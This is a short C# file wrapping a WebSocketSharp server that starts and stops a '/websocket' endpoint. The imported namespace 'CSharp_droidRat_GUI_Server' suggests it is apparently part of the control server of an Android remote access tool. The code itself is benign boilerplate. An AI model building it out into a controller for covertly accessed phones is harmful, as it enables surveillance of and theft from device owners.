using CSharp_droidRat_GUI_Server.Module.webSocket;
using WebSocketSharp.Server;

// ReSharper disable once CheckNamespace
namespace WesocketServer_JE
{
    public class WebSocketServerJe
    {
        private bool _running;
        private readonly WebSocketServer _webSocketServer;

        public WebSocketServerJe(string server)
        {
            _webSocketServer = new WebSocketServer(server);
            _webSocketServer.AddWebSocketService<WebSocket>("/websocket");
        }

        public void Connect()
        {
            if (_running) return;
            _webSocketServer.Start();
            _running = true;
        }

        public void Close()
        {
            if (_webSocketServer == null || _running != true) return;
            _webSocketServer.Stop();
            _running = false;
        }
    }
}